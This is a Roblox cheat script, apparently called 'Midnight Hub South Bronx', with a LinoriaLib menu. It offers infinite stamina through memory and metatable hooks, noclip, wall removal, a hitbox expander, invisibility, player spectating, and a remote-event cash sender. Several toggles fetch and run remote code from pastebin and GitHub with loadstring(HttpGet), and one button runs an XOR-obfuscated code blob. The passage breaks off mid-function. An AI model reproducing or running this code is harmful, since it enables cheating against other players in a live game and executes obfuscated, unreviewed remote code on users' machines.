local player = game.Players.LocalPlayer
local uis = game:GetService("UserInputService")
local runService = game:GetService("RunService")

-- Hide default cursor
player:GetMouse().Icon = ""

-- Remove previous cursor if exists
if player.PlayerGui:FindFirstChild("CustomCursorGui") then
    player.PlayerGui.CustomCursorGui:Destroy()
end

-- Create GUI for the custom cursor
local cursorGui = Instance.new("ScreenGui")
cursorGui.Name = "CustomCursorGui"
cursorGui.Parent = player.PlayerGui
cursorGui.ResetOnSpawn = false
cursorGui.IgnoreGuiInset = true

-- Create the arrow cursor image (replace asset ID with your own blue arrow)
local cursor = Instance.new("ImageLabel")
cursor.Name = "BlueArrowCursor"
cursor.BackgroundTransparency = 1
cursor.Size = UDim2.new(0, 32, 0, 32)
cursor.Image = "rbxassetid://1234567890" -- Replace with your blue arrow asset ID
cursor.Parent = cursorGui

-- Drag logic
local dragging = false
local dragPos = nil

-- Helper: check if mouse is over LinoriaLib UI (by checking for any visible GUI except our cursor)
local function isOverLinoriaUI()
    local mousePos = uis:GetMouseLocation()
    local guiObjects = player.PlayerGui:GetGuiObjectsAtPosition(mousePos.X, mousePos.Y)
    for _, obj in ipairs(guiObjects) do
        if obj ~= cursor and obj.Visible then
            return true
        end
    end
    return false
end

-- Drag events
uis.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 and isOverLinoriaUI() then
        dragging = true
        dragPos = uis:GetMouseLocation()
    end
end)
uis.InputEnded:Connect(function(input, gpe)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
        dragPos = nil
    end
end)

-- Update cursor position
runService.RenderStepped:Connect(function()
    local pos
    if dragging and dragPos then
        pos = dragPos
    else
        pos = uis:GetMouseLocation()
    end
    cursor.Position = UDim2.new(0, pos.X, 0, pos.Y)
end)

-- Update drag position while dragging (only if mouse is still over UI)
uis.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        if isOverLinoriaUI() then
            dragPos = uis:GetMouseLocation()
        else
            dragging = false
            dragPos = nil
        end
    end
end)


local repo
if
    game:GetService('UserInputService').TouchEnabled
    or game:GetService('UserInputService').GamepadEnabled
then
    repo =
        'https://raw.githubusercontent.com/LionTheGreatRealFrFr/MobileLinoriaLib/main/'
    print('Mobile Loaded')
else
    repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
    print('PC Loaded')
end

-- // UI Library
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager =
    loadstring(
        game:HttpGet(repo .. 'addons/ThemeManager.lua')
    )()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

-- // Get Player Info
local LocalPlayer = game:GetService('Players').LocalPlayer
local Username = LocalPlayer.Name

-- // Show Notification on Script Load
Library:Notify('Midnight Hub South Bronx Thanks For Using)', 5)

-- // Create Main UI Window
local Window = Library:CreateWindow({
    Title = 'Midnight Hub South Bronx | Premium FREE FOR 2 WEEKS Version',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2,
})

-- // Tabs
local Tabs = {
    Main = Window:AddTab('Main'),
    Combat = Window:AddTab('Combat'),
    Visuals = Window:AddTab('Visuals'),
    Misc = Window:AddTab('Misc'),
    Teleports = Window:AddTab('Teleports'),
    ['Settings'] = Window:AddTab('Settings'),
}

-- // Create Groupboxes
local CarGroup = Tabs['Misc']:AddRightGroupbox('Car Mods')
local VisualsGroup = Tabs['Visuals']:AddLeftGroupbox('Visuals')
local CombatGroup = Tabs['Combat']:AddLeftGroupbox('Combat')
local AutofarmGroup = Tabs['Misc']:AddRightGroupbox('Autofarm')
local MiscGroup = Tabs['Misc']:AddLeftGroupbox('Misc')
local ShopGroup = Tabs['Misc']:AddLeftGroupbox('Quickbuy')
local ViewOptionsGroup = Tabs['Main']:AddRightGroupbox('ViewOptions')
local ServerSettingsGroup = Tabs['Main']:AddRightGroupbox('Server Settings')
local GunGroup = Tabs['Combat']:AddRightGroupbox('Gun Mods')
local DamageGroup = Tabs['Teleports']:AddRightGroupbox('DamageTeleports & BikeTeleports')


--UI SETTINGS
local MenuGroup = Tabs['Settings']:AddLeftGroupbox('Menu')
local MenuGroupRight = Tabs['Settings']:AddRightGroupbox('Server')

local madeByLabel = MenuGroup:AddLabel('Made by: Andrew')

MenuGroup:AddButton('Copy Discord', function()
    setclipboard('https://discord.gg/kAVtqhBJhd')
    Library:Notify('Discord link copied!', 3)
end)

MenuGroupRight:AddButton('Rejoin Server', function()
    game
        :GetService('TeleportService')
        :Teleport(game.PlaceId, game:GetService('Players').LocalPlayer)
end)

MenuGroupRight:AddButton('Server Hop', function()
    loadstring(
        [[local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v15,v16) local v17={};for v23=1, #v15 do v6(v17,v0(v4(v1(v2(v15,v23,v23 + 1 )),v1(v2(v16,1 + (v23% #v16) ,1 + (v23% #v16) + 1 )))%256 ));end return v5(v17);end local v8=game:GetService(v7("\229\198\215\32\246\180\213\10\226\198\201\51\239\184\194","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\11\217\62\213\207\38\223\60\204\255\38","\156\67\173\74\165"));local v10=game:GetService(v7("\4\187\72\15\185\52\85","\38\84\215\41\118\220\70"));local v11=game.PlaceId;if  not v11 then local v24=791 -(368 + 423) ;while true do if (v24==(0 + 0)) then warn(v7("\96\26\35\17\251\121\50\98\27\237\16\24\43\30\176\16\55\48\23\190\73\25\55\82\236\69\24\44\27\240\87\86\54\26\247\67\86\43\28\190\98\25\32\30\241\72\86\17\6\235\84\31\45\77","\158\48\118\66\114"));return;end end end local v12=AllIDs or {} ;local v13="";local function v14() local v18=18 -(10 + 8) ;local v19;local v20;local v21;while true do if (v18==(997 -(915 + 82))) then v19=v7("\163\48\4\38\96\255\180\228\35\17\59\118\182\181\185\43\18\58\124\189\181\168\43\29\121\101\244\180\172\37\29\51\96\234","\155\203\68\112\86\19\197")   .. v11   .. v7("\9\206\51\238\86\125\247\235\9\237\35\254\76\113\230\167\85\210\36\232\111\106\225\253\84\128\23\239\67\62\233\241\75\212\34\161\17\40\181","\152\38\189\86\156\32\24\133") ;if (v13~="") then v19=v19   .. v7("\186\84\178\84\239\88\181\27","\38\156\55\199")   .. v13 ;end v18=2 -1 ;end if (v18==(1 + 0)) then v20,v21=pcall(function() return v9:JSONDecode(game:HttpGet(v19));end);if (v20 and v21.data) then local v25=442 -(416 + 26) ;while true do if (v25==(0 -0)) then for v26,v27 in ipairs(v21.data) do if ((v27.playing<v27.maxPlayers) and  not table.find(v12,v27.id)) then local v28=0 + 0 ;while true do if (v28==1) then return;end if (v28==(1187 -(1069 + 118))) then local v29=438 -(145 + 293) ;while true do if (v29==(430 -(44 + 386))) then table.insert(v12,v27.id);v8:TeleportToPlaceInstance(v11,v27.id,v10.LocalPlayer);v29=2 -1 ;end if ((1 -0)==v29) then v28=1 + 0 ;break;end end end end end end v13=v21.nextPageCursor or "" ;break;end end else warn(v7("\142\124\117\36\22\112\186\87\167\61\122\45\7\119\242\3\187\120\110\62\22\102\233\25\232","\35\200\29\28\72\115\20\154")   .. tostring(v21) );end break;end end end while v13~=nil  do local v22=0 -0 ;while true do if (v22==(772 -(201 + 571))) then v14();wait(1 + 0 );break;end end end]]
    )()
end)

MenuGroup:AddButton('Unload', function()
    Library:Unload()
end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker(
    'MenuKeybind',
    { Default = 'End', NoUI = true, Text = 'Menu keybind' }
)

Library.ToggleKeybind = Options.MenuKeybind

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
ThemeManager:SetFolder('MyScriptHub')
SaveManager:SetFolder('MyScriptHub/specific-game')
SaveManager:BuildConfigSection(Tabs['Settings'])
ThemeManager:ApplyToTab(Tabs['Settings'])
SaveManager:LoadAutoloadConfig()

local menuVisible = false
local menuWindow = MenuGroup.Parent

game
    :GetService('UserInputService').InputBegan
    :Connect(function(input, gameProcessed)
        if gameProcessed then
            return
        end
        if input.UserInputType == Enum.UserInputType.Keyboard then
            if input.KeyCode == Enum.KeyCode.End then
                menuVisible = not menuVisible
                menuWindow.Visible = menuVisible
            end
        end
    end)

local PlayerGroup = Tabs['Main']:AddLeftGroupbox('Player')

-- Default Variables
_G.kR9 = false -- Infinite Stamina state
local spinEnabled = false
local spinSpeed = 0
local stretchConnection
local player = game.Players.LocalPlayer
local Camera = workspace.CurrentCamera
local runService = game:GetService('RunService')

-- Infinite Stamina Logic
PlayerGroup:AddToggle('InfiniteStamina', {
    Text = 'Infinite Stamina',
    Default = false,
    Tooltip = 'Grants you infinite stamina.',
    Callback = function(state)
        _G.kR9 = state
        if state then
            print('Infinite Stamina Enabled')
        else
            print('Infinite Stamina Disabled')
        end
    end,
})

-- Infinite Stamina Logic Handler
local vD1 = false
for _, nB4 in pairs(getgc(true)) do
    if type(nB4) == 'table' then
        for pL7, yH3 in pairs(nB4) do
            if pL7 == 'Stamina' then
                vD1 = true
                local tF8 = getmetatable(nB4)
                if tF8 then
                    setreadonly(tF8, false)
                    local cJ4 = tF8.__index
                    local wK6 = tF8.__newindex

                    tF8.__index = function(t, k)
                        if k == 'Stamina' and _G.kR9 then
                            return 100
                        end
                        return cJ4(t, k)
                    end

                    tF8.__newindex = function(t, k, v)
                        if k == 'Stamina' and _G.kR9 then
                            return
                        end
                        return wK6(t, k, v)
                    end
                end

                runService.Heartbeat:Connect(function()
                    if _G.kR9 then
                        nB4.Stamina = 100
                        if nB4.createLowStamina then
                            nB4.createLowStamina = function()
                                return
                            end
                        end
                    end
                end)
                break
            end
        end
    end
    if vD1 then
        break
    end
end

PlayerGroup:AddToggle('InfiniteZoom', {
    Text = 'Infinite Zoom',
    Default = false,
    Tooltip = 'Removes zoom limit.',
    Callback = function(state)
        local host = game:GetService('Players').LocalPlayer
        host.CameraMaxZoomDistance = math.huge
    end,
})

PlayerGroup:AddToggle('InstaInteract', {
    Text = 'Instant Interact',
    Default = false,
    Tooltip = 'Instantly interact with prompts.',
    Callback = function()
        for _, v in pairs(game:GetService('Workspace'):GetDescendants()) do
            if v:IsA('ProximityPrompt') then
                v.HoldDuration = 0
            end
        end
        game
            :GetService('ProximityPromptService').PromptButtonHoldBegan
            :Connect(function(v)
                v.HoldDuration = 0
            end)
    end,
})

-- Noclip
local Workspace = game:GetService('Workspace')
local Players = game:GetService('Players')
local localPlayer = Players.LocalPlayer
local camera = Workspace.CurrentCamera
local roadsSidewalksFolder = Workspace:FindFirstChild('Map')
    and Workspace.Map:FindFirstChild('Roads/Sidewalks')
local opp = {}
local noclipEnabled = false

local function setHiddenProperty(instance, property, value)
    pcall(function()
        sethiddenproperty(instance, property, value)
    end)
end

local function exclusionssf(part)
    return (roadsSidewalksFolder and part:IsDescendantOf(roadsSidewalksFolder))
        or (part.Name == 'default')
        or (part.Name == 'Sidewalk')
        or (part.Name == 'Floor')
        or (part.Name == 'Collision')
        or (part.Name == 'QuaterCylinder')
        or part:IsDescendantOf(localPlayer.Character)
        or (part.Parent and part.Parent:IsA('Model') and Players:GetPlayerFromCharacter(
            part.Parent
        ) ~= nil)
        or (part:IsA('VehicleSeat') or part:IsA('Vehicle'))
end

local function updmommy()
    local pp = camera.CFrame.Position
    local radius = 15
    local region = Region3.new(
        pp - Vector3.new(radius, radius, radius),
        pp + Vector3.new(radius, radius, radius)
    )
    local parts = Workspace:FindPartsInRegion3(region, nil, math.huge)
    for _, part in ipairs(parts) do
        if part:IsA('BasePart') and not exclusionssf(part) then
            if not opp[part] then
                opp[part] = {
                    CanCollide = part.CanCollide,
                }
                setHiddenProperty(part, 'CanCollide', false)
            end
        end
    end
end

local function reset()
    for part, props in pairs(opp) do
        if part:IsA('BasePart') then
            setHiddenProperty(part, 'CanCollide', props.CanCollide)
        end
    end
    opp = {}
end

PlayerGroup:AddToggle('Noclip', {
    Text = 'No Clip',
    Callback = function(state)
        noclipEnabled = state
        if noclipEnabled then
            print('Noclip Enabled')
            task.spawn(function()
                while noclipEnabled do
                    updmommy()
                    task.wait(0.1)
                end
            end)
        else
            print('Noclip Disabled')
            reset()
        end
    end,
})

MiscGroup:AddToggle('CtrlClickDelete', {
    Text = 'Ctrl + Click = Delete',
    Default = false,
    Tooltip = 'Ctrl+Click to delete parts.',
    Callback = function()
        local Plr = game:GetService('Players').LocalPlayer
        local Mouse = Plr:GetMouse()
        Mouse.Button1Down:Connect(function()
            if
                not game
                    :GetService('UserInputService')
                    :IsKeyDown(Enum.KeyCode.LeftControl)
            then
                return
            end
            if not Mouse.Target then
                return
            end
            Mouse.Target:Destroy()
        end)
    end,
})

local NoWallsEnabled = false
local Walls = {}
local WallsParent = {}
local objectsToRemove = {}

local function deepFind(parent, name)
    for _, obj in ipairs(parent:GetDescendants()) do
        if obj:IsA('Instance') and obj:GetFullName() == name then
            return obj
        end
    end
    return nil
end

local function removeWalls()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if
            obj:IsA('Part')
            or obj:IsA('MeshPart')
            or obj:IsA('UnionOperation')
        then
            if string.match(obj.Name:lower(), 'wall') or obj.Size.Y > 8 then
                if not Walls[obj] then
                    Walls[obj] = obj
                    WallsParent[obj] = obj.Parent
                    obj.Parent = nil
                end
            end
        end
    end
    for _, path in ipairs(objectsToRemove) do
        local obj = deepFind(workspace, path)
        if obj then
            obj:Destroy()
        end
    end
end

local function restoreWalls()
    for wall, parent in pairs(WallsParent) do
        if wall and parent then
            wall.Parent = parent
        end
    end
    Walls = {}
    WallsParent = {}
end

MiscGroup:AddToggle('NoWalls', {
    Text = 'No Walls',
    Callback = function(enabled)
        NoWallsEnabled = enabled
        if NoWallsEnabled then
            removeWalls()
        else
            restoreWalls()
        end
    end,
})

MiscGroup:AddToggle('FixFloor', {
    Text = 'Fix-Floor',
    Callback = function()
        local player = game.Players.LocalPlayer
        local function fixFloor()
            local floor = workspace:FindFirstChild('Floor')
            if floor then
                floor.Size = Vector3.new(5000, -1, 5000)
                floor.Position = Vector3.new(0, 0, 0)
                floor.Anchored = true
            else
                floor = Instance.new('Part')
                floor.Name = 'Floor'
                floor.Size = Vector3.new(5000, -1, 5000)
                floor.Position = Vector3.new(0, 0, 0)
                floor.Anchored = true
                floor.Parent = workspace
            end
        end
        player.CharacterAdded:Connect(function(character)
            fixFloor()
        end)
        if player.Character then
            fixFloor()
        end
    end,
})

PlayerGroup:AddToggle('HitboxExpander', {
    Text = 'Hitbox Expander',
    Default = false,
    Tooltip = 'This Expands the Hitbox of Players.',
    Callback = function(state)
        if state then
            loadstring(game:HttpGet('https://pastebin.com/raw/6zXxnvRE'))()
        end
    end,
})

getgenv().Nitradenags = false
getgenv().CustomName = 'Midnight Hub On Top'
getgenv().Nitradenagrs = false
getgenv().OriginalName = nil
getgenv().CustomNameIngame = 'Name'

local function UPDJN()
    local player = game.Players.LocalPlayer
    if
        player
        and player.Character
        and player.Character:FindFirstChild('Head')
    then
        local rankTag = player.Character.Head:FindFirstChild('RankTag')
        if rankTag then
            local mainFrame = rankTag:FindFirstChild('MainFrame')
            if mainFrame then
                local nameLabel = mainFrame:FindFirstChild('NameLabel')
                if nameLabel then
                    if getgenv().Nitradenags then
                        nameLabel.Text = getgenv().CustomName
                    else
                        nameLabel.Text = player.Name
                    end
                end
            end
        end
    end
end

local function UINGAPP()
    local player = game.Players.LocalPlayer
    if
        player
        and player.Character
        and player.Character:FindFirstChild('Head')
    then
        local nameTag = player.Character.Head:FindFirstChild('NameTag')
        if nameTag then
            local mainFrame = nameTag:FindFirstChild('MainFrame')
            if mainFrame then
                local nameLabel = mainFrame:FindFirstChild('NameLabel')
                if nameLabel then
                    if getgenv().Nitradenagrs then
                        nameLabel.Text = getgenv().CustomNameIngame
                    elseif getgenv().OriginalName then
                        nameLabel.Text = getgenv().OriginalName
                    end
                end
            end
        end
    end
end

game:GetService('RunService').Heartbeat:Connect(function()
    UPDJN()
    UINGAPP()
end)

PlayerGroup:AddToggle('UserSpoof', {
    Text = 'User Spoof',
    Default = false,
    Tooltip = 'Spoofs your username on the RankTag.',
    Callback = function(state)
        getgenv().Nitradenags = state
        if state then
            print('User Spoof Enabled')
        else
            print('User Spoof Disabled')
        end
    end,
})

MiscGroup:AddToggle('EquipAll', {
    Text = 'Equip All',
    Default = false,
    Tooltip = 'Equips all tools in your backpack.',
    Callback = function(state)
        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v:IsA('Tool') then
                v.Parent = game.Players.LocalPlayer.Character
            end
        end
    end,
})

PlayerGroup:AddToggle('Invisible', {
    Text = 'Invisible ( M )',
    Default = false,
    Tooltip = 'Enables invisibility (Key Is M).',
    Callback = function(state)
        if state then
            loadstring(game:HttpGet('https://pastebin.com/raw/HZF918x2'))()
        end
    end,
})

MiscGroup:AddToggle('ForwardTeleport', {
    Text = 'Forward Teleport ( T )',
    Default = false,
    Tooltip = 'This Teleports You Forward.',
    Callback = function(state)
        if state then
            loadstring(game:HttpGet('https://pastebin.com/raw/ZjVJQMAk'))()
        end
    end,
})

PlayerGroup:AddToggle('StretchRes', {
    Text = 'Stretch Res',
    Default = false,
    Tooltip = 'Stretches your resolution.',
    Callback = function(state)
        getgenv().stretchResEnabled = state
        if state then
            getgenv().Resolution = { ['.gg/scripters'] = 0.65 }
            if not stretchConnection then
                stretchConnection = runService.RenderStepped:Connect(function()
                    Camera.CFrame = Camera.CFrame
                        * CFrame.new(
                            0,
                            0,
                            0,
                            1,
                            0,
                            0,
                            0,
                            getgenv().Resolution['.gg/scripters'],
                            0,
                            0,
                            0,
                            1
                        )
                end)
            end
        else
            if stretchConnection then
                stretchConnection:Disconnect()
                stretchConnection = nil
            end
        end
    end,
})

PlayerGroup:AddSlider('AdjustSpeed', {
    Text = 'Adjust Speed',
    Default = 12,
    Min = 0,
    Max = 23,
    Rounding = 1,
    Tooltip = 'Adjust your walkspeed.',
    Callback = function(value)
        local player = game.Players.LocalPlayer
        local humanoid = player.Character
            and player.Character:FindFirstChild('Humanoid')
        if humanoid then
            humanoid.WalkSpeed = value
        end
    end,
})

PlayerGroup:AddSlider('AdjustFOV', {
    Text = 'Adjust FOV',
    Default = 70,
    Min = 70,
    Max = 120,
    Rounding = 1,
    Tooltip = 'Adjust your camera FOV.',
    Callback = function(value)
        workspace.CurrentCamera.FieldOfView = value
    end,
})

local spinEnabled = false
local spinSpeed = 0

local player = game.Players.LocalPlayer

local function UpdateSpin()
    local character = player.Character
    if character and spinEnabled then
        local rootPart = character:FindFirstChild('HumanoidRootPart')
        if rootPart then
            local currentRotation = rootPart.CFrame
            local newRotation = currentRotation
                * CFrame.Angles(0, math.rad(spinSpeed), 0)
            rootPart.CFrame = newRotation
        end
    end
end

PlayerGroup:AddToggle('SpinBot', {
    Text = 'Spin Bot',
    Default = false,
    Tooltip = 'Spin your character.',
    Callback = function(enabled)
        spinEnabled = enabled
    end,
})

PlayerGroup:AddSlider('SpinSpeed', {
    Text = 'Spin Speed',
    Default = 10,
    Min = 1,
    Max = 100,
    Rounding = 0,
    Tooltip = 'Adjust the spin speed.',
    Callback = function(value)
        spinSpeed = value
    end,
})

game:GetService('RunService').RenderStepped:Connect(function()
    UpdateSpin()
end)

-- ...existing code...

-- === ViewOptionsGroup Features ===

local TargetName = ''
local originalCameraSubject
local ScreenGui
local IsSpectating = false
local selectedPlayer = nil
local totalToSend = 0
local totalSent = 0
local cooldownActive = false

-- Helper to get player names
local function getPlayers()
    local t = {}
    for _, v in ipairs(game:GetService('Players'):GetPlayers()) do
        if v ~= game.Players.LocalPlayer then
            table.insert(t, v.Name)
        end
    end
    return t
end

-- Function to update all related features with the selected player
local function updateSelectedPlayer(playerName)
    selectedPlayer = playerName
    TargetName = playerName -- Update TargetName to sync with other features

    -- Spectate Update
    local Players = game:GetService('Players')
    if IsSpectating then
        local TargetPlayer = Players:FindFirstChild(TargetName)
        if TargetPlayer and TargetPlayer.Character then
            workspace.CurrentCamera.CameraSubject =
                TargetPlayer.Character:FindFirstChild(
                    'Humanoid'
                )
        end
    end

    -- View Inventory Update
    if ScreenGui then
        createInventoryGUI(TargetName)
    end
end

-- Function to find player by name
local function findPlayerByName(name)
    name = string.lower(name)
    for _, player in pairs(game.Players:GetPlayers()) do
        local playerName = string.lower(player.Name)
        local displayName = player.DisplayName
                and string.lower(player.DisplayName)
            or nil
        if
            string.sub(playerName, 1, #name) == name
            or (displayName and string.sub(displayName, 1, #name) == name)
        then
            return player
        end
    end
    return nil
end

-- Add player dropdown and handle selection
ViewOptionsGroup:AddDropdown('SelectPlayer', {
    Values = getPlayers(),
    Default = getPlayers()[1] or '',
    Text = 'Select Player',
    Callback = function(Value)
        updateSelectedPlayer(Value)
    end,
})

-- Add "Spectate" toggle and handle spectating functionality
ViewOptionsGroup:AddToggle('Spectate', {
    Text = 'Spectate',
    Default = false,
    Tooltip = 'Spectate the selected player.',
    Callback = function(Value)
        local Players = game:GetService('Players')
        if Value then
            if IsSpectating then
                return
            end
            local TargetPlayer = Players:FindFirstChild(TargetName)
            if TargetPlayer and TargetPlayer.Character then
                originalCameraSubject = workspace.CurrentCamera.CameraSubject
                workspace.CurrentCamera.CameraSubject =
                    TargetPlayer.Character:FindFirstChild(
                        'Humanoid'
                    )
                IsSpectating = true
            else
                if Library and Library.Notify then
                    Library:Notify('Invalid Name', 3)
                end
            end
        else
            if IsSpectating then
                workspace.CurrentCamera.CameraSubject = originalCameraSubject
                IsSpectating = false
            end
        end
    end,
})

-- Inventory GUI
local function createInventoryGUI(playerName)
    if ScreenGui then
        ScreenGui:Destroy()
    end

    ScreenGui = Instance.new('ScreenGui')
    local Background = Instance.new('Frame')
    local ScrollFrame = Instance.new('ScrollingFrame')
    local TitleLabel = Instance.new('TextLabel')
    local UIListLayout = Instance.new('UIListLayout')
    local UIListPadding = Instance.new('UIPadding')
    local InvLabels = {}

    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    Background.Name = 'Background'
    Background.Parent = ScreenGui
    Background.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
    Background.BorderSizePixel = 2
    Background.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Background.Position = UDim2.new(1, -260, 0, 20)
    Background.Size = UDim2.new(0.12, 0, 0.3, 0)
    Background.ClipsDescendants = true

    local gradient = Instance.new('UIGradient')
    gradient.Parent = Background
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(42, 42, 42)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(42, 42, 42)),
    })
    gradient.Rotation = 45

    local stroke = Instance.new('UIStroke')
    stroke.Parent = Background
    stroke.Color = Color3.fromRGB(0, 0, 0)
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    TitleLabel.Name = 'TitleLabel'
    TitleLabel.Parent = Background
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Size = UDim2.new(1, 0, 0, 30)
    TitleLabel.Font = Enum.Font.SourceSansBold
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.TextSize = 18
    TitleLabel.TextScaled = true
    TitleLabel.TextWrapped = true
    TitleLabel.TextStrokeTransparency = 0.3
    TitleLabel.Text = 'Inventory'

    ScrollFrame.Parent = Background
    ScrollFrame.Size = UDim2.new(1, -10, 0, 250)
    ScrollFrame.Position = UDim2.new(0, 5, 0, 35)
    ScrollFrame.ScrollBarThickness = 10
    ScrollFrame.BackgroundTransparency = 1
    ScrollFrame.ClipsDescendants = true

    UIListLayout.Parent = ScrollFrame
    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Padding = UDim.new(0, 5)

    UIListPadding.Parent = ScrollFrame
    UIListPadding.PaddingTop = UDim.new(0, 5)

    local function createLabel(name)
        local label = Instance.new('TextLabel')
        label.Name = name
        label.BackgroundTransparency = 0.5
        label.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        label.BorderSizePixel = 1
        label.BorderColor3 = Color3.fromRGB(30, 30, 30)
        label.Size = UDim2.new(1, -10, 0, 22)
        label.Font = Enum.Font.SourceSans
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextScaled = true
        label.TextSize = 14
        label.TextWrapped = true
        return label
    end

    for i = 1, 40 do
        local label = createLabel('Inv' .. i)
        label.Parent = ScrollFrame
        table.insert(InvLabels, label)
    end

    local function getPlayerInventory(targetPlayer)
        local backpack = targetPlayer:FindFirstChildOfClass('Backpack')
        if backpack then
            local items = backpack:GetChildren()
            for i, label in ipairs(InvLabels) do
                label.Text = items[i] and items[i].Name or ''
            end
            ScrollFrame.CanvasSize = UDim2.new(
                0,
                0,
                0,
                math.max(#items, #InvLabels) * 27
            )
        else
            for _, label in ipairs(InvLabels) do
                label.Text = 'No Items'
            end
            ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 27)
        end
    end

    local targetPlayer = findPlayerByName(playerName)

    if targetPlayer then
        TitleLabel.Text = playerName .. "'s Inventory"
        getPlayerInventory(targetPlayer)
    else
        TitleLabel.Text = 'Player Not Found'
    end
end

ViewOptionsGroup:AddToggle('ViewInventory', {
    Text = 'View [Inventory]',
    Default = false,
    Tooltip = "View the selected player's inventory.",
    Callback = function(State)
        if State then
            createInventoryGUI(TargetName)
        else
            if ScreenGui then
                ScreenGui:Destroy()
                ScreenGui = nil
            end
        end
    end,
})

-- Cash Sender
local cashSentLabel = ViewOptionsGroup:AddLabel('Cash Sent: 0')
local cashLeftLabel = ViewOptionsGroup:AddLabel('Cash Left to Send: 0')

ViewOptionsGroup:AddInput('TotalAmountToSend', {
    Default = '',
    Numeric = true,
    Placeholder = 'Enter amount',
    Text = 'Total Amount To Send',
    Callback = function(Value)
        totalToSend = tonumber(Value) or 0
        if totalToSend < 1 then
            totalToSend = nil
        end
    end,
})

ViewOptionsGroup:AddToggle('EnableCashSender', {
    Text = 'Enable Cash Sender',
    Default = false,
    Callback = function(Value)
        local Obsidian = getgenv().Obsidian
        sendingEnabled = Value
        totalSent = 0
        while sendingEnabled and totalSent < (totalToSend or 0) do
            if cooldownActive then
                if Obsidian and Obsidian.MakeNotification then
                    Obsidian:MakeNotification({
                        Text = 'Cooldown Active',
                        Content = 'Please wait for the cooldown to finish.',
                        Image = 'rbxassetid://4483345998',
                        Time = 5,
                    })
                end
                break
            end
            local sendAmount = math.min(10000, (totalToSend or 0) - totalSent)
            if selectedPlayer and sendAmount > 0 then
                game
                    :GetService('ReplicatedStorage')
                    :WaitForChild('RemoteEvents')
                    :WaitForChild('Transfer')
                    :FireServer(selectedPlayer, sendAmount)
                totalSent = totalSent + sendAmount
                cashSentLabel:SetText('Cash Sent: ' .. totalSent)
                cashLeftLabel:SetText(
                    'Cash Left to Send: ' .. ((totalToSend or 0) - totalSent)
                )
                if totalSent < (totalToSend or 0) then
                    if Obsidian and Obsidian.MakeNotification then
                        Obsidian:MakeNotification({
                            Text = 'Cooldown Started',
                            Content = 'Waiting 30 seconds before next transaction.',
                            Image = 'rbxassetid://4483345998',
                            Time = 30,
                        })
                    end
                    cooldownActive = true
                    task.wait(31)
                    cooldownActive = false
                end
            end
        end
        if selectedPlayer and totalSent > 0 then
            if Obsidian and Obsidian.MakeNotification then
                Obsidian:MakeNotification({
                    Text = 'Transaction Complete!',
                    Content = 'Sent $'
                        .. tostring(totalSent)
                        .. ' to '
                        .. tostring(selectedPlayer),
                    Image = 'rbxassetid://4483345998',
                    Time = 5,
                })
            end
        end
    end,
})



-- ...existing code...

-- Mod Detection Toggle (with connection management)
local connection
local function onPlayerAdded(player)
    -- Your mod detection logic here
    print('Player joined:', player.Name)
end

ServerSettingsGroup:AddToggle('ModDetection', {
    Text = 'Mod Detection',
    Default = false,
    Tooltip = 'Detects when new players join the server.',
    Callback = function(state)
        if state then
            connection = game.Players.PlayerAdded:Connect(onPlayerAdded)
        else
            if connection then
                connection:Disconnect()
                connection = nil
            end
        end
    end,
})

-- Server Hop Toggle
ServerSettingsGroup:AddToggle('ServerHop', {
    Text = 'Server Hop',
    Default = false,
    Tooltip = 'Hop to a different server.',
    Callback = function(state)
        if state then
            loadstring(
                game:HttpGet(
                    'https://raw.githubusercontent.com/Morples/Server-hop/refs/heads/main/Script',
                    true
                )
            )()
        end
    end,
})

-- Rejoin Server Toggle
ServerSettingsGroup:AddToggle('RejoinServer', {
    Text = 'Rejoin Server',
    Default = false,
    Tooltip = 'Rejoin the current server.',
    Callback = function(state)
        if state then
            local TeleportService = game:GetService('TeleportService')
            local Players = game:GetService('Players')
            local LocalPlayer = Players.LocalPlayer

            local Rejoin = coroutine.create(function()
                local Success, ErrorMessage = pcall(function()
                    TeleportService:Teleport(game.PlaceId, LocalPlayer)
                end)
                if ErrorMessage and not Success then
                    warn(ErrorMessage)
                end
            end)
            coroutine.resume(Rejoin)
        end
    end,
})

-- Join Lowest Server Toggle
ServerSettingsGroup:AddToggle('JoinLowestServer', {
    Text = 'Join Lowest Server',
    Default = false,
    Tooltip = 'Join the server with the lowest player count.',
    Callback = function(state)
        if state then
            local Http = game:GetService('HttpService')
            local TPS = game:GetService('TeleportService')
            local Api = 'https://games.roblox.com/v1/games/'
            local _place = game.PlaceId
            local _servers = Api
                .. _place
                .. '/servers/Public?sortOrder=Asc&limit=100'
            function ListServers(cursor)
                local Raw = game:HttpGet(
